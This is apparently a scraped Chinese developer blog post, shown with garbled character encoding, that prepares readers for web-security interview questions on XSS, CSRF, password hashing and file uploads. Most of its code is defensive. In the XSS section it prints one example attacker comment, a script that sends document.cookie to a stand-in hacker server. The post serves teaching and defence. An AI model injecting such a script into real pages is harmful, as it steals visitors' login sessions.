  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T12:13:07.000Z" title="Tue Jan 20 2026 12:13:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ‰æ—¶å€™é¢è¯•å®˜å¯èƒ½ä¼šé—®ç½‘ç»œå®‰å…¨çš„é—®é¢˜ï¼Œä»–ä»¬ä¸æ˜¯æƒ³å¬ä½ èƒŒå®šä¹‰ï¼Œè€Œæ˜¯æƒ³çŸ¥é“ï¼š<strong>ä½ å†™ä»£ç æ—¶ï¼Œä¼šä¸ä¼šå¤šæƒ³è¿™ä¹ˆä¸€æ­¥</strong>ã€‚</p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸‹ä¸‹é¢4ä¸ªé—®é¢˜ï¼Œæˆ–è®¸å¯ä»¥è®©æˆ‘ä»¬åœ¨é¢è¯•æ—¶æ›´åŠ æœ‰åº•æ°”ã€‚</p>
<h3 data-id="heading-0">1. XSSæ”»å‡»ï¼šç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼ŒçœŸçš„å®‰å…¨å—ï¼Ÿ</h3>
<p><strong>æ¡ˆä¾‹</strong>ï¼šå°å¼ åšäº†ä¸€ä¸ªè¯„è®ºåŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥è‡ªç”±å‘è¡¨è¯„è®ºã€‚ä»–ç›´æ¥æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚ç»“æœæŸå¤©ï¼Œé¦–é¡µè¢«æŒ‚ä¸Šäº†èµŒåšå¹¿å‘Šï¼Œç½‘ç«™è¢«ç™¾åº¦é™æƒ...</p>
<p><strong>å‘ç”Ÿäº†ä»€ä¹ˆ</strong>ï¼Ÿ<br/>
é»‘å®¢åœ¨è¯„è®ºé‡Œè¾“å…¥äº†è¿™æ ·çš„å†…å®¹ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// çªƒå–ç”¨æˆ·cookie</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://é»‘å®¢æœåŠ¡å™¨.com/steal?cookie='</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å½“å…¶ä»–ç”¨æˆ·çœ‹åˆ°è¿™æ¡è¯„è®ºæ—¶ï¼Œè¿™æ®µä»£ç è‡ªåŠ¨æ‰§è¡Œï¼Œç”¨æˆ·çš„ç™»å½•ä¿¡æ¯å°±è¢«å·èµ°äº†ï¼</p>
<p><strong>æ€ä¹ˆé˜²</strong>ï¼Ÿ<br/>
æ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·è¾“å…¥ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œè¦åšæ¶ˆæ¯’å¤„ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯ç®€å•æ¶ˆæ¯’å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeInput</span>(<span class="hljs-params">userInput</span>) {
  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªä¸´æ—¶div</span>
  <span class="hljs-keyword">const</span> tempDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  <span class="hljs-comment">// æŠŠç”¨æˆ·è¾“å…¥è®¾ä¸ºæ–‡æœ¬ï¼ˆä¸æ˜¯HTMLï¼‰</span>
  tempDiv.<span class="hljs-property">textContent</span> = userInput;
  <span class="hljs-comment">// è·å–å®‰å…¨çš„HTML</span>
  <span class="hljs-keyword">return</span> tempDiv.<span class="hljs-property">innerHTML</span>;
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> comment = <span class="hljs-string">"&lt;script&gt;alert('hack')&lt;/script&gt;"</span>;
<span class="hljs-keyword">const</span> safeComment = <span class="hljs-title function_">sanitizeInput</span>(comment);
<span class="hljs-comment">// safeComment å˜æˆ "&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;"</span>
<span class="hljs-comment">// æµè§ˆå™¨ä¼šåŸæ ·æ˜¾ç¤ºï¼Œä¸ä¼šæ‰§è¡Œè„šæœ¬</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åç«¯Javaæ¶ˆæ¯’ï¼ˆä½¿ç”¨å¼€æºåº“ï¼‰</span>
<span class="hljs-comment">// å…ˆå¼•å…¥ä¾èµ–ï¼šimplementation 'org.owasp.encoder:encoder'</span>

<span class="hljs-keyword">import</span> org.owasp.encoder.Encode;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeHtml</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>;
        <span class="hljs-comment">// å¯¹HTMLå†…å®¹è¿›è¡Œç¼–ç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeOutput</span> <span class="hljs-operator">=</span> Encode.forHtmlContent(userInput);
        System.out.println(safeOutput);
        <span class="hljs-comment">// è¾“å‡ºï¼š&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;</span>
    }
}
</code></pre>
<p><strong>é¢è¯•å°æŠ€å·§</strong>ï¼šä¸è¦åªè¯´è¦è¿‡æ»¤è¾“å…¥ï¼Œè€Œæ˜¯è¯´ï¼š"æˆ‘ä¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå¯¹è¾“å‡ºå†…å®¹æ ¹æ®ä¸Šä¸‹æ–‡è¿›è¡Œç¼–ç ï¼Œå‰åç«¯åŒé‡é˜²æŠ¤ã€‚"</p>
<h3 data-id="heading-1">2. CSRFæ”»å‡»</h3>
<p><strong>æ¡ˆä¾‹</strong>ï¼šå°æåšäº†ä¸€ä¸ªé“¶è¡Œè½¬è´¦åŠŸèƒ½ï¼Œç”¨æˆ·ç™»å½•åå¯ä»¥è½¬è´¦ã€‚æŸå¤©ï¼Œæœ‰ç”¨æˆ·åæ˜ è´¦æˆ·é‡Œçš„é’±è¢«è½¬èµ°äº†ï¼Œä½†è‡ªå·±æ²¡æ“ä½œè¿‡ã€‚è°ƒæŸ¥å‘ç°ï¼Œç”¨æˆ·åœ¨ç™»å½•çŠ¶æ€ä¸‹ç‚¹å‡»äº†ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œå°±è¢«æ‚„æ‚„è½¬è´¦äº†...</p>
<p><strong>å‘ç”Ÿäº†ä»€ä¹ˆ</strong>ï¼Ÿ<br/>
å½“ä½ ç™»å½•ä¸€ä¸ªç½‘ç«™ï¼Œæµè§ˆå™¨ä¼šä¿å­˜ä¸€ä¸ªèº«ä»½è¯æ˜ï¼ˆCookieï¼‰ã€‚é»‘å®¢åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¯±å¯¼ä½ ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ï¼Œè¿™ä¸ªé“¾æ¥ä¼šè‡ªåŠ¨å‘é“¶è¡Œç½‘ç«™å‘é€è½¬è´¦è¯·æ±‚ã€‚å› ä¸ºä½ çš„æµè§ˆå™¨å¸¦ç€Cookieï¼Œé“¶è¡Œä»¥ä¸ºæ˜¯ä½ è‡ªå·±æ“ä½œçš„ï¼</p>
<p><strong>æ€ä¹ˆé˜²</strong>ï¼Ÿ<br/>
æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯éªŒè¯ç ï¼ˆCSRF Tokenï¼‰ï¼šæ¯ä¸ªè¡¨å•éƒ½æœ‰ä¸€ä¸ªéšæœºç”Ÿæˆçš„éªŒè¯ç ï¼ŒæœåŠ¡å™¨ä¼šéªŒè¯è¿™ä¸ªç æ˜¯å¦æœ‰æ•ˆã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- è¡¨å•ä¸­åŠ å…¥ä¸€ä¸ªéšè—çš„token --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf_token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"éšæœºå­—ç¬¦ä¸²å¦‚a1b2c3d4e5"</span>&gt;</span>
  é‡‘é¢ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span>&gt;</span>
  è´¦å·ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to_account"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>è½¬è´¦<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åç«¯éªŒè¯token</span>
<span class="hljs-meta">@PostMapping("/transfer")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">transferMoney</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String amount, 
                           <span class="hljs-meta">@RequestParam</span> String to_account,
                           <span class="hljs-meta">@RequestParam</span> String csrf_token,
                           HttpSession session)</span> {
    
    <span class="hljs-comment">// ä»sessionè·å–æ­£ç¡®çš„token</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">validToken</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">"csrf_token"</span>);
    
    <span class="hljs-comment">// éªŒè¯token</span>
    <span class="hljs-keyword">if</span> (!csrf_token.equals(validToken)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"æ— æ•ˆè¯·æ±‚"</span>);
    }
    
    <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦</span>
    bankService.transfer(amount, to_account);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"è½¬è´¦æˆåŠŸ"</span>;
}
</code></pre>
<p><strong>è§£é‡Š</strong>ï¼šå°±åƒé“¶è¡ŒæŸœå°è½¬è´¦ï¼Œä¸ä»…è¦çœ‹èº«ä»½è¯ï¼ˆç™»å½•çŠ¶æ€ï¼‰ï¼Œè¿˜è¦æ ¸å¯¹é¢„ç•™æ‰‹æœºå·æ”¶åˆ°çš„éªŒè¯ç ï¼ˆCSRF Tokenï¼‰ï¼Œè¦åŒé‡ç¡®è®¤æ˜¯å¦æ˜¯æœ¬äººæ“ä½œã€‚</p>
<h3 data-id="heading-2">3. å¯†ç å®‰å…¨</h3>
<p><strong>æ¡ˆä¾‹</strong>ï¼šæŸç½‘ç«™ç”¨æˆ·æ•°æ®æ³„éœ²ï¼Œ100ä¸‡ç”¨æˆ·çš„å¯†ç è¢«å…¬å¼€ã€‚è°ƒæŸ¥å‘ç°ï¼Œç½‘ç«™æŠŠå¯†ç ç›´æ¥å­˜åˆ°æ•°æ®åº“ï¼Œæ²¡æœ‰åšä»»ä½•å¤„ç†ã€‚æ›´å¯æ€•çš„æ˜¯ï¼Œå¾ˆå¤šç”¨æˆ·åœ¨å¤šä¸ªç½‘ç«™ç”¨åŒä¸€ä¸ªå¯†ç ...</p>
<p><strong>å¸¸è§çš„å¯†ç é”™è¯¯</strong>ï¼š</p>
<ul>
<li>å¯†ç æ˜æ–‡å­˜å‚¨ï¼ˆç›´æ¥å­˜åŸå§‹å¯†ç ï¼‰</li>
<li>åªåšç®€å•MD5åŠ å¯†ï¼ˆå¾ˆå®¹æ˜“ç ´è§£ï¼‰</li>
<li>ä¸é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°ï¼ˆå…è®¸æš´åŠ›ç ´è§£ï¼‰</li>
</ul>
<p><strong>æ­£ç¡®åšæ³•</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®‰å…¨çš„å¯†ç å­˜å‚¨ï¼ˆä½¿ç”¨BCryptï¼‰</span>
<span class="hljs-keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordSecurity</span> {
    
    <span class="hljs-comment">// åˆ›å»ºåŠ å¯†å™¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">BCryptPasswordEncoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>(<span class="hljs-number">12</span>);
    
    <span class="hljs-comment">// ç”¨æˆ·æ³¨å†Œæ—¶ï¼šåŠ å¯†å­˜å‚¨</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">registerUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// åŠ å¯†å¯†ç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> encoder.encode(rawPassword);
        <span class="hljs-comment">// ä¿å­˜åˆ°æ•°æ®åº“</span>
        userDao.save(username, encodedPassword);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ³¨å†ŒæˆåŠŸ"</span>;
    }
    
    <span class="hljs-comment">// ç”¨æˆ·ç™»å½•æ—¶ï¼šéªŒè¯å¯†ç </span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loginUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// ä»æ•°æ®åº“è·å–åŠ å¯†åçš„å¯†ç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> userDao.getPassword(username);
        <span class="hljs-comment">// éªŒè¯å¯†ç æ˜¯å¦åŒ¹é…</span>
        <span class="hljs-keyword">return</span> encoder.matches(rawPassword, encodedPassword);
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆBCryptæ›´å®‰å…¨</strong>ï¼Ÿ</p>
<ol>
<li><strong>åŠ ç›</strong>ï¼šæ¯ä¸ªäººçš„å¯†ç éƒ½åŠ äº†ä¸åŒçš„éšæœºå­—ç¬¦ä¸²ï¼Œé˜²æ­¢å½©è™¹è¡¨æ”»å‡»</li>
<li><strong>æ…¢åŠ å¯†</strong>ï¼šæ•…æ„è®¾è®¡å¾—å¾ˆæ…¢ï¼Œè®©é»‘å®¢éš¾ä»¥æš´åŠ›ç ´è§£</li>
<li><strong>è‡ªé€‚åº”</strong>ï¼šéšç€è®¡ç®—æœºå˜å¿«ï¼Œå¯ä»¥è°ƒæ•´éš¾åº¦</li>
</ol>
<p><strong>é¢å¤–å»ºè®®</strong>ï¼š</p>
<ul>
<li>é‡è¦æ“ä½œï¼ˆå¦‚ä¿®æ”¹å¯†ç ã€å¤§é¢è½¬è´¦ï¼‰è¦æ±‚äºŒæ¬¡éªŒè¯ï¼ˆçŸ­ä¿¡/é‚®ç®±ï¼‰</li>
<li>ç™»å½•å¤±è´¥5æ¬¡åé”å®šè´¦æˆ·ä¸€æ®µæ—¶é—´</li>
<li>å®šæœŸæé†’ç”¨æˆ·ä¿®æ”¹å¯†ç </li>
</ul>
<h3 data-id="heading-3">4. æ–‡ä»¶ä¸Šä¼ </h3>
<p><strong>å°æ•…äº‹</strong>ï¼šæŸè®ºå›å…è®¸ç”¨æˆ·ä¸Šä¼ å¤´åƒï¼Œç»“æœæœ‰é»‘å®¢ä¸Šä¼ äº†ä¸€ä¸ªå›¾ç‰‡ï¼Œå®é™…æ˜¯ä¸ªæ§åˆ¶æœåŠ¡å™¨çš„ç¨‹åºã€‚å‡ å¤©åï¼Œæ•´ä¸ªæœåŠ¡å™¨è¢«ç”¨æ¥æŒ–çŸ¿ï¼Œç½‘ç«™ç˜«ç—ª...</p>
<p><strong>é£é™©åœ¨å“ª</strong>ï¼Ÿ</p>
<ul>
<li>ä¸Šä¼ çš„å›¾ç‰‡å¯èƒ½æ˜¯æœ¨é©¬ç¨‹åº</li>
<li>æ–‡ä»¶åå¯èƒ½åŒ…å«"../"è·³åˆ°å…¶ä»–ç›®å½•</li>
<li>è¶…å¤§æ–‡ä»¶å¯èƒ½å¯¼è‡´æœåŠ¡å™¨å´©æºƒ</li>
</ul>
<p><strong>å®‰å…¨ä¸Šä¼ å››æ­¥æ³•</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/upload-avatar")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadAvatar</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("file")</span> MultipartFile file)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. æ£€æŸ¥æ–‡ä»¶å¤§å°ï¼ˆé™åˆ¶1MBï¼‰</span>
        <span class="hljs-keyword">if</span> (file.getSize() &gt; <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"æ–‡ä»¶ä¸èƒ½è¶…è¿‡1MB"</span>;
        }
        
        <span class="hljs-comment">// 2. æ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼ˆåªå…è®¸å›¾ç‰‡ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">originalName</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> originalName.substring(originalName.lastIndexOf(<span class="hljs-string">"."</span>) + <span class="hljs-number">1</span>).toLowerCase();
        
        <span class="hljs-keyword">if</span> (!Arrays.asList(<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>).contains(extension)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶"</span>;
        }
        
        <span class="hljs-comment">// 3. ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶åï¼ˆé¿å…ç‰¹æ®Šå­—ç¬¦å’Œè·¯å¾„é—®é¢˜ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeName</span> <span class="hljs-operator">=</span> UUID.randomUUID() + <span class="hljs-string">"."</span> + extension;
        
        <span class="hljs-comment">// 4. ä¿å­˜åˆ°å®‰å…¨ä½ç½®</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/safe/uploads/"</span> + safeName;
        file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(savePath));
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®åœ°å€ï¼š/avatars/"</span> + safeName;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä¸Šä¼ å¤±è´¥ï¼š"</span> + e.getMessage();
    }
}
</code></pre>
<p><strong>æç¤º</strong>ï¼šä¸Šä¼ çš„æ–‡ä»¶ä¸è¦ç›´æ¥æ”¾åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œè€Œæ˜¯é€šè¿‡ç¨‹åºæ§åˆ¶è®¿é—®ã€‚è¿™æ ·å³ä½¿æœ‰äººä¸Šä¼ äº†æ¶æ„æ–‡ä»¶ï¼Œä¹Ÿæ— æ³•ç›´æ¥æ‰§è¡Œã€‚</p>
<h2 data-id="heading-4">é¢è¯•åŠ åˆ†é¡¹ï¼šå®‰å…¨æ€ç»´</h2>
<p>æŠ€æœ¯å¾ˆé‡è¦ï¼ŒåŒæ—¶é¢è¯•å®˜ä¹Ÿçœ‹é‡ä½ çš„<strong>æ€ç»´æ–¹å¼</strong>ã€‚ä»¥ä¸‹3ç‚¹ï¼Œè¯´å‡ºæ¥èƒ½åŠ åˆ†ï¼š</p>
<h3 data-id="heading-5">1. å®‰å…¨æ˜¯è¿‡ç¨‹ï¼Œä¸æ˜¯åŠŸèƒ½</h3>
<p>å¾ˆå¤šå›¢é˜ŸæŠŠå®‰å…¨å½“æˆé¡¹ç›®ç»“æŸå‰æ‰è€ƒè™‘çš„äº‹ã€‚å®é™…ä¸Šï¼Œ<strong>å®‰å…¨åº”è¯¥è´¯ç©¿æ•´ä¸ªå¼€å‘è¿‡ç¨‹</strong>ï¼š</p>
<ul>
<li>å†™éœ€æ±‚æ—¶ï¼šè€ƒè™‘å“ªäº›æ•°æ®æ•æ„Ÿï¼Œéœ€è¦ä¿æŠ¤</li>
<li>è®¾è®¡ç³»ç»Ÿæ—¶ï¼šæƒ³æƒ³å¯èƒ½æœ‰å“ªäº›é£é™©ç‚¹</li>
<li>å†™ä»£ç æ—¶ï¼šéµå¾ªå®‰å…¨ç¼–ç è§„èŒƒ</li>
<li>æµ‹è¯•æ—¶ï¼šåŒ…å«å®‰å…¨æµ‹è¯•</li>
<li>ä¸Šçº¿åï¼šç›‘æ§å¼‚å¸¸è¡Œä¸º</li>
</ul>
<h3 data-id="heading-6">2. æœ€å°æƒé™åŸåˆ™</h3>
<p>ç®€å•è¯´ï¼š<strong>åªç»™å¿…è¦çš„æƒé™</strong>ã€‚</p>
<p>åº”ç”¨åˆ°å¼€å‘ä¸­ï¼š</p>
<ul>
<li>æ•°æ®åº“è´¦å·ï¼šä¸è¦ç”¨rootè´¦å·è¿æ¥æ•°æ®åº“ï¼Œåˆ›å»ºä¸“ç”¨è´¦å·ï¼Œåªç»™å¿…è¦æƒé™</li>
<li>åå°ç®¡ç†ï¼šæ™®é€šç¼–è¾‘ä¸èƒ½åˆ é™¤ç”¨æˆ·ï¼Œç®¡ç†å‘˜æ‰èƒ½</li>
<li>APIæƒé™ï¼šç”¨æˆ·åªèƒ½çœ‹åˆ°è‡ªå·±çš„æ•°æ®ï¼Œçœ‹ä¸åˆ°åˆ«äººçš„</li>
</ul>
<h3 data-id="heading-7">3. å¤šå±‚é˜²å¾¡</h3>
<p>ä¸è¦åªé ä¸€ç§é˜²æŠ¤ï¼Œå°±åƒå®¶é‡Œæ—¢æœ‰é—¨é”ï¼Œä¹Ÿæœ‰é˜²ç›—çª—ã€‚å®‰å…¨ä¹Ÿä¸€æ ·ï¼š</p>
<ul>
<li>ç½‘ç»œå±‚ï¼šé˜²ç«å¢™æŒ¡ä½å¯ç–‘è®¿é—®</li>
<li>åº”ç”¨å±‚ï¼šè¾“å…¥éªŒè¯ã€æƒé™æ§åˆ¶</li>
<li>æ•°æ®å±‚ï¼šæ•æ„Ÿæ•°æ®åŠ å¯†</li>
<li>ä¸šåŠ¡å±‚ï¼šå¼‚å¸¸æ“ä½œç›‘æ§</li>
</ul>
<h2 data-id="heading-8">é¢è¯•æ€ä¹ˆå›ç­”ï¼Ÿæ¨¡æ¿æ¥äº†</h2>
<p>å½“é¢è¯•å®˜é—®"ç½‘ç»œå®‰å…¨äº†è§£å¤šå°‘"ï¼Œä½ å¯ä»¥è¿™æ ·è¯´ï¼š</p>
<blockquote>
<p>"æˆ‘è®¤ä¸ºå®‰å…¨ä¸æ˜¯æŸä¸ªéƒ¨é—¨çš„äº‹ï¼Œè€Œæ˜¯æ¯ä¸ªå¼€å‘è€…çš„è´£ä»»ã€‚åœ¨æˆ‘çš„å¼€å‘ç»éªŒä¸­ï¼Œæˆ‘ä¸»è¦å…³æ³¨å‡ ä¸ªå¸¸è§é£é™©ï¼š</p>
</blockquote>
<blockquote>
